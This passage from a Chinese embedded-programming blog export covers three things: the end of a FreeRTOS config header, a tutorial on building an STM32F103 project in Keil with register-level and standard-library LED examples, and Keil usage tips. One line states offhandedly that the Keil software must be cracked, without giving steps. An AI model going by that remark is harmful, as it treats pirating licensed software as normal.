#else
	#define configPRIO_BITS       		4                  
#endif
//中断最低优先级
#define configLIBRARY_LOWEST_INTERRUPT_PRIORITY			15     

//系统可管理的最高中断优先级
#define configLIBRARY_MAX_SYSCALL_INTERRUPT_PRIORITY	5 

#define configKERNEL_INTERRUPT_PRIORITY 		( configLIBRARY_LOWEST_INTERRUPT_PRIORITY &lt;&lt; (8 - configPRIO_BITS) )	/* 240 */

#define configMAX_SYSCALL_INTERRUPT_PRIORITY 	( configLIBRARY_MAX_SYSCALL_INTERRUPT_PRIORITY &lt;&lt; (8 - configPRIO_BITS) )


/****************************************************************
            FreeRTOS与中断服务函数有关的配置选项                         
****************************************************************/
#define xPortPendSVHandler 	PendSV_Handler
#define vPortSVCHandler 	SVC_Handler


/* 以下为使用Percepio Tracealyzer需要的东西，不需要时将 configUSE_TRACE_FACILITY 定义为 0 */
#if ( configUSE_TRACE_FACILITY == 1 )
#include &quot;trcRecorder.h&quot;
#define INCLUDE_xTaskGetCurrentTaskHandle               1   // 启用一个可选函数（该函数被 Trace源码使用，默认该值为0 表示不用）
#endif

#endif /* FREERTOS_CONFIG_H */

</code></pre>
<h1>本文参考</h1>
<ul>
<li><a href="https://www.bilibili.com/video/BV1GN4y157fy?p=7&amp;vd_source=e03d48176855fc5349b27aef691f9cdb">2.1-FreeRTOS移植--FreeRTOS源码下载_哔哩哔哩_bilibili</a></li>
</ul>


                
            </main>

            <footer class="list-content-container">
                
                <details class="record-links" open="open">
                    <summary class="menu-title">
                        links
                        <span class="badge">2</span>
                    </summary>

                    <ul class="record-links-list">
                        
                        <li data-target-id="1545394726">
                            <a href="#1545394726">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_嵌入式);">⬤</span>
                                    
                                </span>
                                
                                <span>串口驱动程序之「发送数据」</span>
                                
                                <div class="record-links-context hover">
                                    <p>详看：<a href="#1545394726" title="串口驱动程序之「发送数据」" class="record-link highlight">串口驱动程序之「发送数据」</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="1813829584">
                            <a href="#1813829584">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_嵌入式);">⬤</span>
                                    
                                </span>
                                
                                <span>STM32 工程的创建 - 基于寄存器或标准库</span>
                                
                                <div class="record-links-context hover">
                                    <p>移植前我们需要有一个基础工程。首先构建一个最简单的 STM-32 基于标准库方式开发的工程（详见 <a href="#1813829584" title="STM32 工程的创建 - 基于寄存器或标准库" class="record-link highlight">STM32 工程的创建 - 基于寄存器或标准库</a>）</p>
<blockquote>
<p>如果你已经移植好可以跳过这一步。这里主要是为了无缝衔接 <a href="#1813829584" title="STM32 工程的创建 - 基于寄存器或标准库" class="record-link highlight">这篇文章</a>。</p>
</blockquote>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                

                
                <details class="record-backlinks" open="open">
                    <summary class="menu-title">
                        backlinks
                        <span class="badge">2</span>
                    </summary>

                    <ul class="record-backlinks-list">
                        
                        <li data-target-id="1813829584">
                            <a href="#1813829584">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_嵌入式);">⬤</span>
                                    
                                </span>
                                
                                <span>STM32 工程的创建 - 基于寄存器或标准库</span>
                                
                                <div class="record-links-context hover">
                                    <p>进一步，你可以尝试移植 FreeRTOS，详看：<a href="#2165426052" title="STM32 移植 FreeRTOS - 基于标准库" class="record-link highlight">STM32 移植 FreeRTOS - 基于标准库</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="3727808739">
                            <a href="#3727808739">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_嵌入式);">⬤</span>
                                    
                                </span>
                                
                                <span>STM32+ESP8266+MQTT 实现阿里云温湿度监控及 LED 点灯（FreeRTOS+标准库 or HAL）</span>
                                
                                <div class="record-links-context hover">
                                    <ol>
<li>C 语言基本语法</li>
<li>STM32 工程创建，详看
<ul>
<li><a href="#1813829584" title="STM32 工程的创建 - 基于寄存器或标准库" class="record-link ">STM32 工程的创建 - 基于寄存器或标准库</a></li>
<li><a href="#1401105135" title="STM32 工程的创建 - 基于 HAL 库" class="record-link ">STM32 工程的创建 - 基于 HAL 库</a></li>
</ul>
</li>
<li>FreeRTOS 的移植，详看
<ul>
<li><a href="#2165426052" title="STM32 移植 FreeRTOS - 基于标准库" class="record-link highlight">STM32 移植 FreeRTOS - 基于标准库</a></li>
<li><a href="#2115225612" title="STM32 移植 FreeRTOS - 基于 HAL 库" class="record-link ">STM32 移植 FreeRTOS - 基于 HAL 库</a></li>
</ul>
</li>
</ol>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                
            </footer>
        </article>
        
        <article id="1813829584" class="record">
            <header>
                <h1 class="record-title">STM32 工程的创建 - 基于寄存器或标准库</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>嵌入式</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('STM32');">STM32</button>
                    
                    <button class="btn" onclick="activeTag('Keil');">Keil</button>
                    
                    <button class="btn" onclick="activeTag('C');">C</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>4/2/2024</span>
                </div>
                

                

                
                <div class="record-description">
                    <span>description :</span>
                    <span>附两种方式的 LED 点灯。</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>6c1cd7d0</span>
                </div>
                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/20240404230910.webp</span>
                </div>
                
                <div class="record-top_img">
                    <span>top_img :</span>
                    <span></span>
                </div>
                
            </header>

            <main class="record-content">
                <p>目前 STM32 的开发方式有 3 个层次：</p>
<ol>
<li>基于寄存器方式。极少的人使用这种形式。这种方式最底层、最直接、效率更高，但 STM32 寄存器十分复杂，一般不建议采取这种方式。</li>
<li>基于标准库（库函数）方式。使用 ST 官方提供封装好的函数，通过调用函数间接配置寄存器。这种方式对开发人员比较友好，有利于提高开发效率。</li>
<li>基于 HAL 库方式。HAL 库是 ST 公司目前主力推的开发方式，全称就是 Hardware Abstraction Layer（抽象印象层）。可以使用图形化界面快速配置 STM32，隐藏底层的逻辑。</li>
</ol>
<p>这里介绍基于寄存器或标准库方式创建 STM32 工程（以 STM32F103C8T6 为例，其它型号大差不差），并通过点灯演示示例。基于 HAL 库方式请移步：<a href="#1401105135" title="STM32 工程的创建 - 基于 HAL 库" class="record-link ">STM32 工程的创建 - 基于 HAL 库</a></p>
<p>软件安装提示：阅读前请准备好 Keil uVision5 MDK 的安装（可以和 Keil C51 安在一起），软件需破解。安装和破解过程不再赘述。Keil 的一些使用技巧可以看这篇文章：<a href="#2617906225" title="Keil 的使用技巧与问题解决" class="record-link ">Keil 的使用技巧与问题解决</a></p>
<p>LED 点灯实验工具准备：</p>
<ol>
<li>ST-LINK</li>
<li>STM32（以 STM32F103C8T6 最小核心板为例）</li>
<li>杜邦线若干</li>
</ol>
<h1>固件库下载</h1>
<p>进入官网： <a href="https://www.st.com/">https://www.st.com/</a></p>
<p>右上角选择中文。根据菜单选择：工具与软件&gt;嵌入式软件&gt;STM32 微控制器软件。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240402142752.webp" alt="image.png"></p>
<p>选择标准外设软件库，选择 F1 系列。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240402142956.webp" alt="image.png"></p>
<p>点击获取最新版本进行下载。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240402142533.webp" alt="image.png"></p>
<p>解压后得到固件库文件夹：</p>
<pre><code class="language-tree">STM32F10x_StdPeriph_Lib_V3.6.0
│  Package_license.html
│  Package_license.md
│  Release_Notes.html          # 发行说明
│  stm32f10x_stdperiph_lib_um.chm # 使用手册
├─Libraries
│  ├─CMSIS
│  │  ├─CM3 # Cortex-M3
│  │  │  ├─CoreSupport # 【C】 内核的寄存器描述文件
│  │  │  │      core_cm3.c
│  │  │  │      core_cm3.h
│  │  │  └─DeviceSupport
│  │  │      └─ST
│  │  │          └─STM32F10x
│  │  │              │  LICENSE.txt
│  │  │              │  Release_Notes.html
│  │  │              │  stm32f10x.h # 【B】STM32 外设寄存器描述文件。和51单片机REGX52.H的作用相似，描述寄存器和对应的地址
│  │  │              │  system_stm32f10x.c # 【B】用于配置时钟
│  │  │              │  system_stm32f10x.h # 【B】用于配置时钟
│  │  │              └─startup
│  │  │                  ├─arm   # 【A】STM32的启动文件
......
│  │  └─Documentation
│  └─STM32F10x_StdPeriph_Driver # stm32 标准外设驱动
│      │  LICENSE.txt
│      │  Release_Notes.html
│      │
│      ├─inc # 【E】库函数的头文件。
│      │      misc.h
......
│      │
│      └─src # 【D】库函数的源文件。除了misc.c，其余都是内核外的外设库函数
│              misc.c    # 内核库函数。
......
├─Project # 官方提供的工程示例和模板
│  ├─STM32F10x_StdPeriph_Examples
│  └─STM32F10x_StdPeriph_Template
│      │  LICENSE.txt
│      │  main.c
│      │  Release_Notes.html
│      │  stm32f10x_conf.h  # 【F】配置库函数头文件的包含关系
│      │  stm32f10x_it.c    # 【F】存放中断函数
│      │  stm32f10x_it.h    # 【F】存放中断函数
│      │  system_stm32f10x.c
├─Utilities # 官方评估板的相关例程
│  └─STM32_EVAL
└─_htmresc  

</code></pre>
<p>注意上面带【A】【B】【C】【D】【E】【F】标号的文件位置，后面会有相应操作。</p>
<h1>新建项目</h1>
<p>打开 Keil，选择 Project&gt;New uVision project。</p>
<ul>
<li>选择你要存放项目的文件夹（这个文件夹下有多个项目）</li>
<li>再<strong>新建一个文件夹</strong>（这个文件夹存放一个项目的所有东西，文件夹名称以后可以方便改）</li>
<li>选择新的空文件夹进入，设置工程的名字（比如这里为 <code>STM32-proj</code>）。工程的名字可以设置为通用的名字（以后不太方便改）。</li>
</ul>
<p>注意路径名称 <strong>不要有中文</strong>。</p>
<p>新建工程后，选择 STM32F103C8：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240402145049.webp" alt="image.png|500"></p>
<p>我们可以把弹出的新建工程小助手给关掉，这里暂时不演示其的使用。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240402145240.webp" alt="image.png|500"></p>
<p>我们就得到以下文件结构：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240402150100.webp" alt="image.png|475"></p>
<h1>库函数移植</h1>
<p>接下来我们将新建多个文件夹以对新文件进行分类，每个人有不同的风格，我这里就演示 <a href="https://jiangxiekeji.com/">江科大</a> 的风格。</p>
<p>在项目文件夹中新建 Start 文件夹，并按照以下要求进行操作：</p>
<ul>
<li>把固件库文件夹中【A】文件夹下的所有 <code>.s</code> 文件复制到这里。</li>
<li>把固件库文件夹中【B】标识的三个文件也复制到这里。</li>
<li>把固件库文件夹中【C】文件夹下的所有文件（2 个文件）复制到这里。</li>
</ul>
<p>回到 Keil，现在将我们新建的 Start 添加到工程。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240402151820.webp" alt="image.png|500"></p>
<blockquote>
<p>至于确定自己芯片型号的缩写，可看文末介绍。STM32F103C8T6 应选择后缀为 <code>md</code> 的启动文件。</p>
</blockquote>
<p>同样的方法也将这几个也加进来，结果如下图：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240402152131.webp" alt="image.png|301"></p>
<p>上图中 Start 组里的文件我们是不需要进行修改的。（我们还可以在电脑文件管理器中将这些文件设置为只读，这样可以避免误修改。这时上图的文件图标上就会带有一把小钥匙，表示这是只读文件。）</p>
<p>接下来为工程添加头文件路径，不然编译的时候找不到头文件：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240402152833.webp" alt="image.png"></p>
<p>然后两次 OK，退出魔术棒弹窗。</p>
<h1>main 函数</h1>
<p>新建 User 文件夹（同样也是 <a href="https://jiangxiekeji.com/">江科大</a> 的风格）：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240402153154.webp" alt="image.png"></p>
<p>回到 Keil，新建组，并改名为 User。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240402153256.webp" alt="image.png"></p>
<p>在组里面新建文件：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240402153412.webp" alt="image.png"></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240402153455.webp" alt="image.png|500"></p>
<p>进入 main.c，插入头文件：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240402153642.webp" alt="image.png"></p>
<p>main.c 内容如下：</p>
<pre><code class="language-c">#include &quot;stm32f10x.h&quot;                  // Device header

int main(void){
	while(1){
		
	}
}
// 最后一行为空行，不然编译后出现警告

</code></pre>
<p>选择编译并建立工程：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240402153954.webp" alt="image.png"></p>
<p>下面的提示栏显示 0 错误，0 警告，说明工程建立没问题：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240402154045.webp" alt="image.png"></p>
<blockquote>
<p>[!success] 基于寄存器开发 STM32 工程创建结束<br>
进行到这里时并没有使用库函数。如果想用寄存器开发 STM32，那么新建一个工程到这里就结束了。可以继续阅读下面两节进行寄存器点灯操作。</p>
</blockquote>
<h1>接线与调试器配置</h1>
<p>接线图：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240402155804.webp" alt="image.png|475"></p>
<p>注意，当你使用的引脚标号位置与上图不一致时，请以你使用的器件为准。</p>
<p>调试器配置：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240402160256.webp" alt="image.png"></p>
<p>继续点击 Setting，设置下载程序后立即复位运行，这样比较方便。否则下载之后都需要按一下复位按钮才能执行程序。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240402160418.webp" alt="image.png"></p>
<p>重新编译一下。</p>
<h1>基于寄存器的 LED 点灯</h1>
<blockquote>
<p>本小节可略读。</p>
</blockquote>
<p>接下来通过寄存器点亮连接 PC13（就在最小核心板上）的 LED 灯：</p>
<pre><code class="language-c">#include &quot;stm32f10x.h&quot;                  // Device header

int main(void){
	// 基于手册配置寄存器
	RCC-&gt;APB2ENR = 0x00000010;
	GPIOC-&gt;CRH = 0x00300000;
	GPIOC-&gt;ODR = 0x00000000; // 灭灯为 0x00002000
	while(1){
		
	}
}

</code></pre>
<p>编译后没有错误即可下载：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240402161813.webp" alt="image.png"></p>
<p>程序现象为最小核心板的 PC13 连接的 LED 灯点亮。</p>
<p>基于寄存器编程代码简洁，但需要不断查询手册，过程比较繁杂。且为了不影响寄存器中的其它位，还需要进行 <code>|=</code> 和 <code>&amp;=</code> 操作。</p>
<h1>为工程添加库函数</h1>
<p>新建 Library 文件夹（同样也是 <a href="https://jiangxiekeji.com/">江科大</a> 的风格）：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240402164717.webp" alt="image.png|378"></p>
<p>在项目文件夹中新建 Library 文件夹，并按照以下要求进行操作：</p>
<ul>
<li>把固件库文件夹中【D】文件夹下的所有 <code>.c</code> 文件复制到这里。</li>
<li>把固件库文件夹中【E】文件夹下的所有 <code>.h</code> 文件复制到这里。</li>
</ul>
<p>回到 Keil 软件，和 Start 文件夹的操作类似（往上翻复习一下）。添加组并命名 Library，添加已经存在的文件（Library 下所有的 <code>.c</code> 和 <code>.h</code> 文件，注意文件类型筛选器选择 All Files）。结果为：<img src="https://cdn.gallery.uuanqin.top/img/20240402170002.webp" alt="image.png"></p>
<p>Library 中的这些文件我们也不需要更改，可以把它们的权限设置为只读。</p>
<p>在项目文件夹中之前建立的 User 文件夹（存放 main.c 函数的文件夹）中：</p>
<ul>
<li>把固件库文件夹中标记【F】的 3 个文件复制到这里。</li>
</ul>
<p>回到 Keil 软件，把这三个文件也添加到 User 组里。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240402170855.webp" alt="image.png"></p>
<p>我们的 main.c 中第一行中添加了头文件 <code>#include &quot;stm32f10x.h&quot;</code>，将光标放在头文件名中，右键选择打开头文件。我们看到一个条件编译：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240402171518.webp" alt="image.png"></p>
<p>意思是如果定义了 <code>USE_STDPERIPH_DRIVER</code>（使用标准外设驱动）字符串，就引用 <code>stm32f10x_conf.h</code>。接下来打开魔术棒（工程选项），将字符串粘贴到这里：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240402171731.webp" alt="image.png"></p>
<p>这样才能包含标准外设库。</p>
<blockquote>
<p><code>STM32F10X_MD</code> 字符串 Keil 已经定义好，不需要我们手动定义。</p>
</blockquote>
<p>最后别忘了把 User 和 Library 文件夹添加到头文件路径中：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240402172008.webp" alt="image.png"></p>
<p>顺便提一点，在这个按钮中我们可以根据喜好调整组的顺序或向组添加文件（比如把 Start 和 Library 这些不需要更改的文件往上移）：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240402172207.webp" alt="image.png|500"></p>
<p>到这里，重新编译一下，检查是否有错。</p>
<blockquote>
<p>其实所有的 <code>.h</code> 文件是可以不必加到组里的。编译一次后 Keil 中也能看到 <code>.h</code> 文件。这里我们还是沿用 <a href="https://jiangxiekeji.com/">江科大</a> 的风格。</p>
</blockquote>
<h1>基于库函数的 LED 点灯</h1>
<p>main.c 函数：</p>
<pre><code class="language-c">#include &quot;stm32f10x.h&quot;                  // Device header

int main(void){
	GPIO_InitTypeDef GPIO_InitStructure; // 声明放在前面以防报错（或使用C99 mode）
	RCC_APB2PeriphClockCmd(RCC_APB2Periph_GPIOC,ENABLE); 
	GPIO_InitStructure.GPIO_Mode=GPIO_Mode_Out_PP; // 推挽
	GPIO_InitStructure.GPIO_Pin=GPIO_Pin_13;
	GPIO_InitStructure.GPIO_Speed=GPIO_Speed_50MHz;
	GPIO_Init(GPIOC,&amp;GPIO_InitStructure);
	GPIO_ResetBits(GPIOC,GPIO_Pin_13);             // 输出高电平
//	GPIO_SetBits(GPIOC,GPIO_Pin_13);               // 输出低电平
	while(1){
		
	}
}

</code></pre>
<p>编译并下载，观察输出高电平或低电平的实验现象。</p>
<blockquote>
<p>[!success] 至此，基于标准库开发 STM32 工程创建及示例介绍完毕。</p>
</blockquote>
<p>如果 <code>GPIO_InitTypeDef</code> 放在 <code>RCC_APB2PeriphClockCmd</code> 之后，编译时有时候会产生这种错误：</p>
<blockquote>
<p>[!bug] 编译错误<br>
error:  #268: declaration may not appear after executable statement in block</p>
</blockquote>
<p>解决方法见：<a href="#2617906225" title="Keil 的使用技巧与问题解决" class="record-link ">Keil 的使用技巧与问题解决</a>。</p>
<h1>其它</h1>
<h2>移植 FreeRTOS</h2>
<p>进一步，你可以尝试移植 FreeRTOS，详看：<a href="#2165426052" title="STM32 移植 FreeRTOS - 基于标准库" class="record-link ">STM32 移植 FreeRTOS - 基于标准库</a></p>
<h2>STM32 型号分类及缩写</h2>
<table>
<thead>
<tr>
<th>缩写</th>
<th>释义</th>
<th>Flash 容量</th>
<th>型号</th>
</tr>
</thead>
<tbody>
<tr>
<td>LD_VL</td>
<td>小容量产品超值系列</td>
<td>16~32K</td>
<td>STM32F100</td>
</tr>
<tr>
<td>MD_VL</td>
<td>中容量产品超值系列</td>
<td>64~128K</td>
<td>STM32F100</td>
</tr>
<tr>
<td>HD_VL</td>
<td>大容量产品超值系列</td>
<td>256~512K</td>
<td>STM32F100</td>
</tr>
<tr>
<td>LD</td>
<td>小容量产品</td>
<td>16~32K</td>
<td>STM32F101/102/103</td>
</tr>
<tr>
<td>MD</td>
<td>中容量产品</td>
<td>64~128K</td>
<td>STM32F101/102/103</td>
</tr>
<tr>
<td>HD</td>
<td>大容量产品</td>
<td>256~512K</td>
<td>STM32F101/102/103</td>
</tr>
<tr>
<td>XL</td>
<td>加大容量产品</td>
<td>大于 512K</td>
<td>STM32F101/102/103</td>
</tr>
<tr>
<td>CL</td>
<td>互联型产品</td>
<td>-</td>
<td>STM32F105/107</td>
</tr>
</tbody>
</table>
<p>STM32F103C8T6 的 Flash 容量为 64K。</p>
<h2>工程架构</h2>
<p>我们可以再捋一遍我们建立的工程的架构：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240402193416.webp" alt="image.png"></p>
<p>startup_xx.s：程序执行最基本的文件，定义了中断向量表，中断服务函数等。复位中断为程序的入口。</p>
<h1>本文参考</h1>
<ul>
<li><a href="https://www.bilibili.com/video/BV1th411z7sn?p=4&amp;vd_source=e03d48176855fc5349b27aef691f9cdb">新建工程_哔哩哔哩_bilibili</a></li>
<li><a href="https://www.bilibili.com/video/BV1fS4y1W7Me/">STM32HAL库纯使用向教学，STM32HAL库学习（一）32单片机讲解以及开发环境的配置。_哔哩哔哩_bilibili</a></li>
</ul>


                
            </main>

            <footer class="list-content-container">
                
                <details class="record-links" open="open">
                    <summary class="menu-title">
                        links
                        <span class="badge">3</span>
                    </summary>

                    <ul class="record-links-list">
                        
                        <li data-target-id="1401105135">
                            <a href="#1401105135">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_嵌入式);">⬤</span>
                                    
                                </span>
                                
                                <span>STM32 工程的创建 - 基于 HAL 库</span>
                                
                                <div class="record-links-context hover">
                                    <p>这里介绍基于寄存器或标准库方式创建 STM32 工程（以 STM32F103C8T6 为例，其它型号大差不差），并通过点灯演示示例。基于 HAL 库方式请移步：<a href="#1401105135" title="STM32 工程的创建 - 基于 HAL 库" class="record-link highlight">STM32 工程的创建 - 基于 HAL 库</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="2165426052">
                            <a href="#2165426052">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_嵌入式);">⬤</span>
                                    
                                </span>
                                
                                <span>STM32 移植 FreeRTOS - 基于标准库</span>
                                
                                <div class="record-links-context hover">
                                    <p>进一步，你可以尝试移植 FreeRTOS，详看：<a href="#2165426052" title="STM32 移植 FreeRTOS - 基于标准库" class="record-link highlight">STM32 移植 FreeRTOS - 基于标准库</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="2617906225">
                            <a href="#2617906225">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_嵌入式);">⬤</span>
                                    
                                </span>
                                
                                <span>Keil 的使用技巧与问题解决</span>
                                
                                <div class="record-links-context hover">
                                    <p>软件安装提示：阅读前请准备好 Keil uVision5 MDK 的安装（可以和 Keil C51 安在一起），软件需破解。安装和破解过程不再赘述。Keil 的一些使用技巧可以看这篇文章：<a href="#2617906225" title="Keil 的使用技巧与问题解决" class="record-link highlight">Keil 的使用技巧与问题解决</a></p>
<p>解决方法见：<a href="#2617906225" title="Keil 的使用技巧与问题解决" class="record-link highlight">Keil 的使用技巧与问题解决</a>。</p>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                

                
                <details class="record-backlinks" open="open">
                    <summary class="menu-title">
                        backlinks
                        <span class="badge">3</span>
                    </summary>

                    <ul class="record-backlinks-list">
                        
                        <li data-target-id="1401105135">
                            <a href="#1401105135">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_嵌入式);">⬤</span>
                                    
                                </span>
                                
                                <span>STM32 工程的创建 - 基于 HAL 库</span>
                                
                                <div class="record-links-context hover">
                                    <p>本篇文章介绍使用 STM32CubeMX 创建 STM32 工程的文章，并实现一个 LED 点灯的案例。如果打算使用寄存器或标准库方式创建项目，可移步这篇文章：<a href="#1813829584" title="STM32 工程的创建 - 基于寄存器或标准库" class="record-link highlight">STM32 工程的创建 - 基于寄存器或标准库</a>。关于 Keil 的更多使用技巧可详看这篇文章：<a href="#2617906225" title="Keil 的使用技巧与问题解决" class="record-link ">Keil 的使用技巧与问题解决</a>。</p>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="2165426052">
                            <a href="#2165426052">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_嵌入式);">⬤</span>
                                    
                                </span>
                                
                                <span>STM32 移植 FreeRTOS - 基于标准库</span>
                                
                                <div class="record-links-context hover">
                                    <p>移植前我们需要有一个基础工程。首先构建一个最简单的 STM-32 基于标准库方式开发的工程（详见 <a href="#1813829584" title="STM32 工程的创建 - 基于寄存器或标准库" class="record-link highlight">STM32 工程的创建 - 基于寄存器或标准库</a>）</p>
<blockquote>
<p>如果你已经移植好可以跳过这一步。这里主要是为了无缝衔接 <a href="#1813829584" title="STM32 工程的创建 - 基于寄存器或标准库" class="record-link highlight">这篇文章</a>。</p>
</blockquote>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="3727808739">
                            <a href="#3727808739">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_嵌入式);">⬤</span>
                                    
                                </span>
                                
                                <span>STM32+ESP8266+MQTT 实现阿里云温湿度监控及 LED 点灯（FreeRTOS+标准库 or HAL）</span>
                                
                                <div class="record-links-context hover">
                                    <ol>
<li>C 语言基本语法</li>
<li>STM32 工程创建，详看
<ul>
<li><a href="#1813829584" title="STM32 工程的创建 - 基于寄存器或标准库" class="record-link highlight">STM32 工程的创建 - 基于寄存器或标准库</a></li>
<li><a href="#1401105135" title="STM32 工程的创建 - 基于 HAL 库" class="record-link ">STM32 工程的创建 - 基于 HAL 库</a></li>
</ul>
</li>
<li>FreeRTOS 的移植，详看
<ul>
<li><a href="#2165426052" title="STM32 移植 FreeRTOS - 基于标准库" class="record-link ">STM32 移植 FreeRTOS - 基于标准库</a></li>
<li><a href="#2115225612" title="STM32 移植 FreeRTOS - 基于 HAL 库" class="record-link ">STM32 移植 FreeRTOS - 基于 HAL 库</a></li>
</ul>
</li>
</ol>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                
            </footer>
        </article>
        
        <article id="2617906225" class="record">
            <header>
                <h1 class="record-title">Keil 的使用技巧与问题解决</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>嵌入式</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('Keil');">Keil</button>
                    
                    <button class="btn" onclick="activeTag('C');">C</button>
                    
                    <button class="btn" onclick="activeTag('C++');">C++</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>4/2/2024</span>
                </div>
                

                

                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/20240403123341.webp</span>
                </div>
                
                <div class="record-description">
                    <span>description :</span>
                    <span>各种错误解决方法与技巧的收集</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>9c0a1431</span>
                </div>
                
                <div class="record-top_img">
                    <span>top_img :</span>
                    <span></span>
                </div>
                
            </header>

            <main class="record-content">
                <p>本文汇集常见 Keil 使用错误的解决方案及使用技巧。</p>
<h1>C99 模式</h1>
<p>编译时有时候会产生这种错误：</p>
<blockquote>
<p>[!bug] 编译错误<br>
error:  #268: declaration may not appear after executable statement in block</p>
</blockquote>
<p>我们需要将声明放到前面以避免错误。或者直接勾选 C99 Mode 即可。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240402230926.webp" alt="image.png"></p>
<h1>字符集设置</h1>
<p>扳手工具设置字符集，解决文件中乱码问题。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240402154800.webp" alt="image.png|500"></p>
<h1>字体大小设置</h1>
<p>同样是扳手工具里，选择「颜色与字体」进行调整：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240402154959.webp" alt="image.png|500"></p>
<h1>模板的创建与使用</h1>
<p>每次编写驱动时，新的头文件都要输入防重复包含的语句。我们可以通过设置模板方便头文件的创建。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240402155124.webp" alt="image.png"></p>
<p>使用时双击即可：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240402155328.webp" alt="image.png"></p>
<p>附我的模板，注意末尾空行：</p>
<pre><code class="language-c">#ifndef _|_H
#define __H

#endif /*  __H  */

</code></pre>
<h1>快捷键使用工具</h1>
<p>尝试使用这些工具能加速你的开发：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240402162820.webp" alt="image.png"></p>
<p>上图框选的工具除了保存、复制粘贴、撤销等基础工具外，还有：</p>
<ul>
<li>前进与后退。</li>
<li>标记。</li>
<li>缩进。</li>
<li>注释与取消注释。</li>
</ul>
<p>我们可以直接使用快捷键使用。对于没有快捷键的（比如注释和取消注释），可以在扳手中进行设置：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240402163408.webp" alt="image.png|500"></p>
<p>附其它常用快捷键：</p>
<ul>
<li>F12：跳转到定义</li>
<li>Ctrl+Alt+ 空格：联想补全。（注意，部分用户会存在与输入法的快捷键冲突。）</li>
</ul>
<blockquote>
<p>但是我想说，和 JetBrains 的软件相比，Keil 操作还是很不方便。</p>
</blockquote>


                
            </main>

            <footer class="list-content-container">
                

                
                <details class="record-backlinks" open="open">
                    <summary class="menu-title">
                        backlinks
                        <span class="badge">2</span>
                    </summary>

                    <ul class="record-backlinks-list">
                        
                        <li data-target-id="1401105135">
                            <a href="#1401105135">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_嵌入式);">⬤</span>
                                    
                                </span>
                                
                                <span>STM32 工程的创建 - 基于 HAL 库</span>
                                
                                <div class="record-links-context hover">
